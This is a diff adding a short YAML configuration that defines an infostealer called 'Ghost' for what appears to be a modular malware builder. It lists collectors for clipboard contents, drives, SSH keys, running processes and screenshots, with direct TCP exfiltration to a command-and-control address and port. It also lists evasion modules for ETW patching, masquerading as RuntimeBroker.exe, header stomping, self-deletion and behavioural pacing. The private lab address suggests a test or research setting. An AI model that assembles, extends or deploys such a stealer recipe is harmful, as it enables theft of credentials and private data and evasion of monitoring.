@@ -1,0 +1,28 @@
+name: infostealer_ghost
+description: Ghost infostealer — masquerades as RuntimeBroker.exe, stomps headers, deletes itself after exfil
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/drives
+  - collectors/ssh_keys
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/sequential
+
+evasion:
+  - evasion/etw_patch
+  - evasion/process_masquerade
+  - evasion/header_stomp
+  - evasion/self_delete
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
